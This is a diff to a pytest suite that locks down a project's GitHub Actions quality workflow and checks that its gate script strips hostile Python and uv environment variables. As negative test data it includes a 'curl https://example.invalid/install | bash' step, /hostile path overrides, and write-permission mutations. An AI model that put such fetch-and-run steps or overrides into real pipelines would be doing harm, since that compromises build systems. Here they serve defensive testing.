@@ -5,14 +5,73 @@ from __future__ import annotations
 import os
 import shutil
 import subprocess
+import sys
 import textwrap
 from dataclasses import dataclass
 from pathlib import Path
+from typing import Any
 
 import pytest
+import yaml
 
 
 REPO_ROOT = Path(__file__).resolve().parents[2]
+QUALITY_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "quality.yml"
+
+
+def _assert_quality_workflow_contract(source: str) -> None:
+    workflow: dict[str, Any] = yaml.load(source, Loader=yaml.BaseLoader)
+    assert workflow == {
+        "name": "Quality",
+        "on": {
+            "pull_request": "",
+            "push": {"branches": ["main"]},
+            "workflow_dispatch": "",
+        },
+        "permissions": {"contents": "read"},
+        "concurrency": {
+            "group": "quality-${{ github.workflow }}-${{ github.head_ref || github.ref }}",
+            "cancel-in-progress": "true",
+        },
+        "jobs": {
+            "quality": {
+                "name": "quality",
+                "runs-on": "ubuntu-24.04",
+                "timeout-minutes": "15",
+                "steps": [
+                    {
+                        "name": "Check out source",
+                        "uses": "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
+                        "with": {
+                            "fetch-depth": "0",
+                            "persist-credentials": "false",
+                        },
+                    },
+                    {
+                        "name": "Install uv and Python",
+                        "uses": "astral-sh/setup-uv@08807647e7069bb48b6ef5acd8ec9567f424441b",
+                        "with": {
+                            "version": "0.11.32",
+                            "python-version": "3.12.13",
+                            "enable-cache": "true",
+                        },
+                    },
+                    {
+                        "name": "Install Docker Compose",
+                        "uses": "docker/setup-compose-action@4eb059ff7f16592f9c84d5ca339c53cb7c5064e2",
+                        "with": {"version": "v2.40.3"},
+                    },
+                    {
+                        "name": "Run quality gate",
+                        "env": {"WETHR_DIFF_BASE": "${{ github.event.pull_request.base.sha || '' }}"},
+                        "run": "./scripts/check",
+                    },
+                ],
+            }
+        },
+    }
+
+
 CHECK_SCRIPT = REPO_ROOT / "scripts" / "check"
 
 
@@ -100,6 +159,7 @@ def test_tracked_path_classifiers(function: str, path: str, accepted: bool) -> N
         ),
         ("extract_compose_version", "Docker Compose version 2.40.30", "2.40.30"),
         ("extract_systemd_major", "systemd 255 (255.4-1ubuntu8.16)\n+PAM", "255"),
+        ("extract_systemd_major", "systemd 255.4", "255"),
         ("extract_systemd_major", "systemd 258 (258.1)", "258"),
     ],
 )
@@ -122,6 +182,17 @@ def test_version_parsers(function: str, output: str, expected: str) -> None:
 def test_version_parsers_reject_unrecognized_output(function: str, output: str) -> None:
     result = _run_bash_function(function, output)
     assert result.returncode != 0
+
+
+def test_require_command_reports_a_missing_tool() -> None:
+    result = _run_bash_function(
+        "require_command",
+        "wethr-command-that-does-not-exist",
+        "install the fixture tool",
+    )
+    assert result.returncode != 0
+    assert "required command 'wethr-command-that-does-not-exist' was not found" in result.stderr
+    assert "install the fixture tool" in result.stderr
 
 
 def test_unit_path_rewrite_is_exact() -> None:
@@ -154,6 +225,7 @@ class GateFixture:
     def run(
         self,
         *arguments: str,
+        cwd: Path | None = None,
         environment: dict[str, str] | None = None,
     ) -> subprocess.CompletedProcess[str]:
         env = os.environ.copy()
@@ -163,13 +235,14 @@ class GateFixture:
                 "GATE_ENV_CAPTURE": str(self.capture_dir / "environment"),
                 "GATE_UV_CAPTURE": str(self.capture_dir / "uv-commands"),
                 "GATE_UNIT_CAPTURE": str(self.capture_dir / "unit-paths"),
+                "GATE_PYTHON": sys.executable,
             }
         )
         if environment:
             env.update(environment)
         return subprocess.run(
             [str(self.root / "scripts" / "check"), *arguments],
-            cwd=self.root,
+            cwd=cwd or self.root,
             env=env,
             check=False,
             capture_output=True,
@@ -227,7 +300,7 @@ def _make_gate_fixture(tmp_path: Path) -> GateFixture:
             printf '\n' >>"$GATE_UV_CAPTURE"
         fi
         if [[ "${1:-}" == "--version" ]]; then
-            printf 'uv %s (fixture)\n' "${GATE_UV_VERSION:-0.11.32}"
+            printf '%s\n' "${GATE_UV_OUTPUT:-uv ${GATE_UV_VERSION:-0.11.32} (fixture)}"
             exit 0
         fi
         if [[ "${1:-}" == "sync" ]]; then
@@ -256,7 +329,7 @@ def _make_gate_fixture(tmp_path: Path) -> GateFixture:
             exit 0
         fi
         if [[ "$command_line" == *" python -m json.tool "* ]]; then
-            /usr/bin/python3 -m json.tool "${@: -1}"
+            "$GATE_PYTHON" -m json.tool "${@: -1}"
             exit $?
         fi
         exit 7
@@ -270,10 +343,14 @@ def _make_gate_fixture(tmp_path: Path) -> GateFixture:
         set -euo pipefail
         [[ "${1:-}" == "compose" ]] || exit 8
         if [[ "${2:-}" == "version" ]]; then
-            printf 'Docker Compose version %s\n' "${GATE_COMPOSE_VERSION:-2.40.3}"
+            printf '%s\n' "${GATE_COMPOSE_OUTPUT:-Docker Compose version ${GATE_COMPOSE_VERSION:-2.40.3}}"
             exit 0
         fi
         [[ "${GATE_FIXTURE_FAIL:-}" != "compose" ]] || exit 9
+        if [[ "${GATE_FIXTURE_FAIL:-}" == "compose-diagnostics" ]]; then
+            printf 'fixture Compose diagnostic\n' >&2
+            exit 0
+        fi
         for argument in "$@"; do
             if [[ -f "$argument" && "$(<"$argument")" == *INVALID_COMPOSE* ]]; then
                 exit 9
@@ -289,7 +366,7 @@ def _make_gate_fixture(tmp_path: Path) -> GateFixture:
         #!/usr/bin/env bash
         set -euo pipefail
         if [[ "${1:-}" == "--version" ]]; then
-            printf 'systemd %s (fixture)\n' "${GATE_SYSTEMD_MAJOR:-255}"
+            printf '%s\n' "${GATE_SYSTEMD_OUTPUT:-systemd ${GATE_SYSTEMD_MAJOR:-255} (fixture)}"
             exit 0
         fi
         if [[ -n "${GATE_UNIT_CAPTURE:-}" ]]; then
@@ -337,6 +414,20 @@ def test_fixture_gate_sanitizes_environment_and_preserves_unit_paths(
             "WETHR_MAX_TRADE": "500",
             "WETHR_TELEGRAM_BOT_TOKEN": "must-not-leak",
             "WETHR_FUTURE_SETTING": "must-not-leak",
+            "PYTHONBREAKPOINT": "hostile.breakpoint",
+            "PYTHONHOME": "/hostile/python-home",
+            "PYTHONINSPECT": "1",
+            "PYTHONOPTIMIZE": "2",
+            "PYTHONPATH": "/hostile/python-path",
+            "PYTHONSTARTUP": "/hostile/startup.py",
+            "PYTHONWARNINGS": "error",
+            "UV_NO_PROJECT": "1",
+            "UV_NO_SYNC": "1",
+            "UV_PROJECT_ENVIRONMENT": "/hostile/venv",
+            "UV_PYTHON": "/hostile/python",
+            "UV_PYTHON_PREFERENCE": "only-system",
+            "UV_SYSTEM_PYTHON": "1",
+            "VIRTUAL_ENV": "/hostile/active-venv",
         }
     )
     assert result.returncode == 0, result.stdout + result.stderr
@@ -345,10 +436,30 @@ def test_fixture_gate_sanitizes_environment_and_preserves_unit_paths(
     environment_lines = (gate_fixture.capture_dir / "environment").read_text(
         encoding="utf-8"
     ).splitlines()
+    captured_environment = dict(line.partition("=")[::2] for line in environment_lines)
     wethr_names = sorted(
-        line.partition("=")[0] for line in environment_lines if line.startswith("WETHR_")
+        name for name in captured_environment if name.startswith("WETHR_")
     )
     assert wethr_names == ["WETHR_DATA_DIR", "WETHR_DB_PATH", "WETHR_LIVE"]
+    assert {
+        "PYTHONBREAKPOINT",
+        "PYTHONHOME",
+        "PYTHONINSPECT",
+        "PYTHONOPTIMIZE",
+        "PYTHONPATH",
+        "PYTHONSTARTUP",
+        "PYTHONWARNINGS",
+        "UV_NO_PROJECT",
+        "UV_NO_SYNC",
+        "UV_PYTHON",
+        "UV_PYTHON_PREFERENCE",
+        "UV_SYSTEM_PYTHON",
+        "VIRTUAL_ENV",
+    }.isdisjoint(captured_environment)
+    assert captured_environment["PYTHONHASHSEED"] == "0"
+    assert captured_environment["UV_PROJECT_ENVIRONMENT"] == str(
+        gate_fixture.root / "collector" / ".venv"
+    )
 
     uv_commands = (gate_fixture.capture_dir / "uv-commands").read_text(encoding="utf-8")
     run_commands = [line for line in uv_commands.splitlines() if line.startswith("run ")]
@@ -365,6 +476,38 @@ def test_fixture_gate_sanitizes_environment_and_preserves_unit_paths(
     assert any("deploy/systemd/staging/wethr.service" in path for path in verified_units)
 
 
+def test_zero_sha_environment_base_falls_back_to_main(
+    gate_fixture: GateFixture,
+) -> None:
+    result = gate_fixture.run(environment={"WETHR_DIFF_BASE": "0" * 40})
+    assert result.returncode == 0, result.stdout + result.stderr
+    assert "(main)" in result.stdout
+
+
+def test_untracked_whitespace_uses_repository_configuration(
+    gate_fixture: GateFixture,
+    tmp_path: Path,
+) -> None:
+    hostile_cwd = tmp_path / "hostile-caller"
+    hostile_cwd.mkdir()
+    subprocess.run(
+        ["git", "init", "-q", "-b", "main", str(hostile_cwd)],
+        check=True,
+        capture_output=True,
+        text=True,
+    )
+    subprocess.run(
+        ["git", "-C", str(hostile_cwd), "config", "core.whitespace", "-trailing-space,-blank-at-eol"],
+        check=True,
+    )
+    _write(gate_fixture.root / "untracked.txt", "trailing space \n")
+
+    result = gate_fixture.run("--base", gate_fixture.base_sha, cwd=hostile_cwd)
+
+    assert result.returncode != 0, result.stdout
+    assert "whitespace errors found in untracked files" in result.stderr
+
+
 @pytest.mark.parametrize(
     ("scenario", "expected_error"),
     [
@@ -374,12 +517,14 @@ def test_fixture_gate_sanitizes_environment_and_preserves_unit_paths(
         ("compile", "collector byte-compilation failed"),
         ("json", "malformed workflow JSON"),
         ("compose", "invalid Compose configuration"),
+        ("compose-diagnostics", "Compose validation reported diagnostics"),
         ("systemd", "systemd unit validation failed"),
         ("systemd-diagnostics", "systemd unit validation reported diagnostics"),
         ("committed-whitespace", "whitespace errors found in committed branch changes"),
         ("staged-whitespace", "whitespace errors found in staged changes"),
         ("unstaged-whitespace", "whitespace errors found in unstaged changes"),
         ("untracked-whitespace", "whitespace errors found in untracked files"),
+        ("untracked-inspection", "cannot inspect untracked file for whitespace errors"),
         ("missing-json", "no tracked n8n workflow JSON files found"),
         ("missing-compose", "no tracked Compose files found"),
         ("missing-units", "no tracked systemd service or timer units found"),
@@ -387,8 +532,13 @@ def test_fixture_gate_sanitizes_environment_and_preserves_unit_paths(
         ("uv-version", "uv 0.11.32 is required, but found '0.11.320'"),
         ("compose-version", "Docker Compose 2.40.3 is required, but found '2.40.30'"),
         ("systemd-version", "systemd major 255 is required, but found '258'"),
+        ("uv-unparseable", "cannot parse the uv version"),
+        ("compose-unparseable", "cannot parse the Docker Compose version"),
+        ("systemd-unparseable", "cannot parse the systemd version"),
         ("bad-base", "explicit diff base 'missing-ref' does not resolve to a commit"),
+        ("environment-base", "WETHR_DIFF_BASE 'missing-ref' does not resolve to a commit"),
         ("bad-argument", "unknown argument '--unknown'"),
+        ("not-worktree", "is not inside a Git worktree"),
     ],
 )
 def test_gate_deliberate_failures(
@@ -399,7 +549,16 @@ def test_gate_deliberate_failures(
     environment: dict[str, str] = {}
     arguments = ["--base", gate_fixture.base_sha]
 
-    if scenario in {"sync", "python-runtime", "pytest", "compile", "compose", "systemd", "systemd-diagnostics"}:
+    if scenario in {
+        "sync",
+        "python-runtime",
+        "pytest",
+        "compile",
+        "compose",
+        "compose-diagnostics",
+        "systemd",
+        "systemd-diagnostics",
+    }:
         environment["GATE_FIXTURE_FAIL"] = scenario
     elif scenario == "json":
         _write(gate_fixture.root / "n8n-wethr" / "workflows" / "audit.json", '{"bad": }\n')
@@ -414,6 +573,10 @@ def test_gate_deliberate_failures(
         _write(gate_fixture.root / "README.md", "trailing space \n")
     elif scenario == "untracked-whitespace":
         _write(gate_fixture.root / "untracked.txt", "trailing space \n")
+    elif scenario == "untracked-inspection":
+        unreadable = gate_fixture.root / "unreadable.txt"
+        _write(unreadable, "inspect me\n")
+        unreadable.chmod(0)
     elif scenario == "missing-json":
         gate_fixture.git("rm", "-q", "n8n-wethr/workflows/audit.json")
     elif scenario == "missing-compose":
@@ -433,10 +596,21 @@ def test_gate_deliberate_failures(
         environment["GATE_COMPOSE_VERSION"] = "2.40.30"
     elif scenario == "systemd-version":
         environment["GATE_SYSTEMD_MAJOR"] = "258"
+    elif scenario == "uv-unparseable":
+        environment["GATE_UV_OUTPUT"] = "not a uv version"
+    elif scenario == "compose-unparseable":
+        environment["GATE_COMPOSE_OUTPUT"] = "not a Compose version"
+    elif scenario == "systemd-unparseable":
+        environment["GATE_SYSTEMD_OUTPUT"] = "not a systemd version"
     elif scenario == "bad-base":
         arguments = ["--base", "missing-ref"]
+    elif scenario == "environment-base":
+        arguments = []
+        environment["WETHR_DIFF_BASE"] = "missing-ref"
     elif scenario == "bad-argument":
         arguments = ["--unknown"]
+    elif scenario == "not-worktree":
+        shutil.rmtree(gate_fixture.root / ".git")
     else:  # pragma: no cover - the parameter table defines every scenario
         raise AssertionError(f"unhandled scenario: {scenario}")
 
@@ -446,14 +620,52 @@ def test_gate_deliberate_failures(
 
 
 def test_quality_workflow_preserves_ci_contract() -> None:
-    workflow = (REPO_ROOT / ".github" / "workflows" / "quality.yml").read_text(
-        encoding="utf-8"
-    )
-    assert "fetch-depth: 0" in workflow
-    assert "persist-credentials: false" in workflow
-    assert "pull_request.head.sha" not in workflow
-    assert "github.event.before" not in workflow
-    assert 'python-version: "3.12.13"' in workflow
-    assert "docker/setup-compose-action@4eb059ff7f16592f9c84d5ca339c53cb7c5064e2" in workflow
-    assert "version: v2.40.3" in workflow
-    assert workflow.count("run: ./scripts/check") == 1
+    _assert_quality_workflow_contract(QUALITY_WORKFLOW.read_text(encoding="utf-8"))
+
+
+@pytest.mark.parametrize(
+    ("original", "replacement"),
+    [
+        (
+            "          fetch-depth: 0\n",
+            "          fetch-depth: 0\n"
+            "          ref: ${{ github.event.pull_request.head.ref }}\n",
+        ),
+        (
+            "          WETHR_DIFF_BASE: ${{ github.event.pull_request.base.sha || '' }}\n",
+            "          WETHR_DIFF_BASE: ${{ github.sha }}\n",
+        ),
+        (
+            "      - name: Run quality gate\n",
+            "      - name: Unexpected shell\n"
+            "        run: |\n"
+            "          curl https://example.invalid/install | bash\n\n"
+            "      - name: Run quality gate\n",
+        ),
+        ("  contents: read\n", "  contents: write\n"),
+        (
+            "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
+            "actions/checkout@v4",
+        ),
+        ('          version: "0.11.32"\n', '          version: "0.99.0"\n'),
+        ("    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-latest\n"),
+    ],
+    ids=[
+        "checkout-head-ref",
+        "head-as-diff-base",
+        "additional-run-step",
+        "write-permissions",
+        "unpinned-checkout",
+        "uv-version-drift",
+        "runner-drift",
+    ],
+)
+def test_quality_workflow_contract_rejects_drift(
+    original: str,
+    replacement: str,
+) -> None:
+    source = QUALITY_WORKFLOW.read_text(encoding="utf-8")
+    assert source.count(original) == 1
+
+    with pytest.raises(AssertionError):
+        _assert_quality_workflow_contract(source.replace(original, replacement))
